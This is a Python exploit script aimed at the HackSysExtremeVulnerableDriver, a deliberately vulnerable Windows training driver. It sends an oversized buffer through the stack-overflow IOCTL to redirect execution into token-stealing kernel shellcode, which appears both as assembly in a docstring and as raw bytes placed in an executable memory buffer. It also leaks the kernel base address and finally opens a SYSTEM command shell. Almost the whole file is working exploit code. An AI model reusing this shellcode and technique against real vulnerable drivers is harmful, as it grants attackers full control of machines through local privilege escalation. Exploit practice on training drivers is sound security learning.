from ctypes import *
import os
import struct
import subprocess

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

def ctl_code(code):
	"""
	Recreate CTL_CODE macro to generate driver IOCTL
	"""
	FILE_DEVICE_UNKNOWN = 0x22
	FILE_ANY_ACCESS = 0
	METHOD_NEITHER = 3

	return ((FILE_DEVICE_UNKNOWN << 16) | (FILE_ANY_ACCESS << 14) | (code << 2) | METHOD_NEITHER)

def _get_ntoskrnl():
	""" 
	ntoskrnl base address dump (in case for mem leak attacks)
	"""
	array_uint64_t = (c_ulonglong * 1024)()

	ntoskrnl_addr = psapi.EnumDeviceDrivers(
	    byref(array_uint64_t),	# lpImageBase
	    sizeof(array_uint64_t), 	# cb 
	    byref(c_long()) 		# lpcbNeeded
	    )

	return array_uint64_t[0]

def _gen_shellcode_buffer(shellcode):
	"""
	Generate shellcode buffer then return his address
	"""
	MEM_COMMIT_MEM_RESERVE = 0x3000
	PAGE_EXECUTE_READWRITE = 0x40
	
	# allocate shellcode in user-land address range
	ptr = kernel32.VirtualAlloc(
		c_int(0), 			# lpAddress
		c_int(len(shellcode)),		# dwSize
		c_int(MEM_COMMIT_MEM_RESERVE), 	# flAllocationType
		c_int(PAGE_EXECUTE_READWRITE)	# flProtect 
		)

	# shellcode address pointer
	shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

	# move shellcode to junk RWX buffer
	kernel32.RtlMoveMemory(
		c_int(ptr),
		shellcode_ptr,
		c_int(len(shellcode))
		)
	
	return ptr

def _HANDLE_driver_connection():
	""" 
	Create handle to driver 
	"""
	handle = kernel32.CreateFileA(
	    "\\\\.\\HackSysExtremeVulnerableDriver",	# lpFileName
	    0xC0000000, 	 			# dwDesiredAccess
	    0, 						# dwShareMode
	    None, 					# lpSecurityAttributes
	    0x3, 					# dwCreationDisposition
	    0, 						# dwFlagsAndAttributes
	    None 					# hTemplateFile
	    )

	return handle

def _send_payload(handle, payload, code):
	"""
	Interacting with the driver
	"""
	IO_CTL = kernel32.DeviceIoControl(
	    handle, 		# hDevice
	    ctl_code(code), 	# dwIoControlCode
	    payload, 		# lpInBuffer
	    len(payload), 	# nInBufferSize
	    None, 		# lpOutBuffer
	    0, 			# nOutBufferSize
	    byref(c_ulong()),   # lpBytesReturned
	    None 		# lpOverlapped
	    )	
	
	return IO_CTL

def main():
	"""
	https://defuse.ca/online-x86-assembler.htm#disassembly
	https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/
	
	push rax
	push rbx
	push rcx

	mov rax, qword ptr [gs:0x188]
	mov rax, qword ptr [rax + 0x70]

	mov rbx, rax

	findPID:

	mov rbx, qword ptr [rbx + 0x188]
	sub rbx, 0x188
	mov rcx, qword ptr [rbx+ 0x180]
	cmp rcx, 4
	jnz findPID

	mov rcx, qword ptr [rbx + 0x208]
	and cl, 0xf0
	mov qword ptr [rax + 0x208], rcx

	pop rcx
	pop rbx
	pop rax
	add rsp, 40
	xor rax, rax
	ret

	# CUSTOM win7 x64 7601.17514.amd64fre.win7sp1_rtm.101119-1850 kshellcode
	"""
	SHELLCODE = bytearray(
		"\xcc\x50\x53\x51\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC3\x48\x8B\x9B\x88\x01\x00\x00\x48\x81\xEB\x88\x01\x00\x00\x48\x8B\x8B\x80\x01\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x08\x02\x00\x00\x80\xE1\xF0\x48\x89\x88\x08\x02\x00\x00\x59\x5B\x58\x48\x83\xC4\x28\x48\x31\xC0\xC3"
	)

	# IOCTL to trigger the stack overflow vulnerability
	# copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
	HEVD_IOCTL_BUFFER_OVERFLOW_STACK = 0x800  # ctl_code(0x800) == 0x222003

	CRASH_OFFSET = 2072	# crash

	# driver file handler 
	hFile = _HANDLE_driver_connection()		  
	print("\n[+] Driver connection initilized!")

	# shellcode buffer address located in user-land
	sbuffer = _gen_shellcode_buffer(SHELLCODE)	
	print("[+] User buffer allocated at: [0x%x]\n" % sbuffer)

	# leak ntoskrnl base address | KASLR bypass
	ntoskrnl = _get_ntoskrnl()	
	print("[*] ntoskrnl.exe: [0x%x]" % ntoskrnl)

	payload = "\x41" * CRASH_OFFSET
	payload += struct.pack("<Q", sbuffer)

	#raw_input("press any key to continue...")

	print("Getting SYSTEM Shell")
	_send_payload(hFile, payload, HEVD_IOCTL_BUFFER_OVERFLOW_STACK)

	print("[+] Exploit Payload Sent!")

	os.system("cmd.exe /k cd C:\\") # get SYSTEM shell

if __name__ == "__main__":
	main()
